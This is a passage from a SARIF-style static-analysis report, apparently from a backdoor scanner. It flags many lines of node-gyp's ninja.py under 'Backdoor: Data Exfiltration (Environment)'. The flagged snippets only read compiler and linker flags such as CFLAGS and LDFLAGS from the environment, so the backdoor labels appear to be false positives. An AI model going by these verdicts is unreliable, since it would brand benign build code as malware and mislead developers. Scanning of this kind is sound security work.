              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1467,
                  "startColumn": 22,
                  "endLine": 1467,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n",
                    "rendered": {
                      "text": "        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n",
                      "markdown": "`        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1465,
                  "startColumn": 22,
                  "endLine": 1465,
                  "endColumn": 72,
                  "snippet": {
                    "text": "            if def_file:\n                implicit_deps.add(def_file)\n        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n",
                    "rendered": {
                      "text": "            if def_file:\n                implicit_deps.add(def_file)\n        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n",
                      "markdown": "`            if def_file:\n                implicit_deps.add(def_file)\n        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1424,
                  "startColumn": 12,
                  "endLine": 1424,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n",
                    "rendered": {
                      "text": "        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n",
                      "markdown": "`        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1422,
                  "startColumn": 12,
                  "endLine": 1422,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n",
                    "rendered": {
                      "text": "        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n",
                      "markdown": "`        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1151,
                  "startColumn": 8,
                  "endLine": 1151,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n",
                    "rendered": {
                      "text": "\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n",
                      "markdown": "`\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n            include_dirs = self.msvs_settings.AdjustIncludeDirs(\n                include_dirs, config_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1126,
                  "startColumn": 21,
                  "endLine": 1126,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n",
                    "rendered": {
                      "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n",
                      "markdown": "`            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1125,
                  "startColumn": 19,
                  "endLine": 1125,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n",
                    "rendered": {
                      "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n",
                      "markdown": "`                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1121,
                  "startColumn": 21,
                  "endLine": 1121,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                    "rendered": {
                      "text": "        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                      "markdown": "`        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1120,
                  "startColumn": 19,
                  "endLine": 1120,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n",
                    "rendered": {
                      "text": "            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n",
                      "markdown": "`            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1115,
                  "startColumn": 21,
                  "endLine": 1115,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n",
                    "rendered": {
                      "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n",
                      "markdown": "`            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1114,
                  "startColumn": 19,
                  "endLine": 1114,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n",
                    "rendered": {
                      "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n",
                      "markdown": "`                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1110,
                  "startColumn": 21,
                  "endLine": 1110,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                    "rendered": {
                      "text": "        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                      "markdown": "`        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1109,
                  "startColumn": 19,
                  "endLine": 1109,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n",
                    "rendered": {
                      "text": "        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n",
                      "markdown": "`        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1105,
                  "startColumn": 18,
                  "endLine": 1105,
                  "endColumn": 68,
                  "snippet": {
                    "text": "            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n",
                    "rendered": {
                      "text": "            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n",
                      "markdown": "`            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 993,
                  "startColumn": 8,
                  "endLine": 993,
                  "endColumn": 22,
                  "snippet": {
                    "text": "                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n",
                    "rendered": {
                      "text": "                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n",
                      "markdown": "`                variables=[(\"defines\", defines)],\n            )\n\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        if partial_info_plist:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 972,
                  "startColumn": 40,
                  "endLine": 972,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n    def WriteMacInfoPlist(self, partial_info_plist, bundle_depends):\n        \"\"\"Write build rules for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            self.GypPathToNinja,\n",
                    "rendered": {
                      "text": "\n    def WriteMacInfoPlist(self, partial_info_plist, bundle_depends):\n        \"\"\"Write build rules for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            self.GypPathToNinja,\n",
                      "markdown": "`\n    def WriteMacInfoPlist(self, partial_info_plist, bundle_depends):\n        \"\"\"Write build rules for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            self.GypPathToNinja,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 957,
                  "startColumn": 8,
                  "endLine": 957,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n",
                    "rendered": {
                      "text": "\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n",
                      "markdown": "`\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n        bundle_depends.extend(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 956,
                  "startColumn": 14,
                  "endLine": 956,
                  "endColumn": 52,
                  "snippet": {
                    "text": "            outputs.append(partial_info_plist)\n\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n",
                    "rendered": {
                      "text": "            outputs.append(partial_info_plist)\n\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n",
                      "markdown": "`            outputs.append(partial_info_plist)\n\n        keys = QuoteShellArgument(json.dumps(extra_arguments), self.flavor)\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 893,
                  "startColumn": 8,
                  "endLine": 893,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n",
                    "rendered": {
                      "text": "        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n",
                      "markdown": "`        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 14,
                  "endLine": 892,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        \"\"\"Writes ninja edges for 'mac_bundle_resources'.\"\"\"\n        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n",
                    "rendered": {
                      "text": "        \"\"\"Writes ninja edges for 'mac_bundle_resources'.\"\"\"\n        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n",
                      "markdown": "`        \"\"\"Writes ninja edges for 'mac_bundle_resources'.\"\"\"\n        xcassets = []\n\n        extra_env = self.xcode_settings.GetPerTargetSettings()\n        env = self.GetSortedXcodeEnv(additional_settings=extra_env)\n        env = self.ComputeExportEnvString(env)\n        isBinary = self.xcode_settings.IsBinaryOutputFormat(self.config_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 838,
                  "startColumn": 12,
                  "endLine": 838,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n",
                    "rendered": {
                      "text": "            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n",
                      "markdown": "`            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n            for path in to_copy[\"files\"]:\n                # Normalize the path so trailing slashes don't confuse us.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 836,
                  "startColumn": 12,
                  "endLine": 836,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n",
                    "rendered": {
                      "text": "        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n",
